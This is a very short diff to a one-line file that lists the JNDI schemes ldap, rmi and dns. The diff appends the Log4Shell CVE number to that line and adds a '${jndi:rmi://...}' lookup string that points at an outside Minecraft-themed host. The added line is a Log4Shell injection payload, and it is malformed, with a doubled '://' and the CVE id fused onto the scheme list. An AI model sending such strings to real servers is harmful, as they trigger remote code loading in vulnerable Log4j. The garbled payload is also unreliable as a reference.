@@ -1,1 +1,2 @@
-ldap://,rmi://,dns://
+ldap://,rmi://,dns://CVE-2021-44228
+${jndi:rmi://://Your-Mine-craft-link.com}
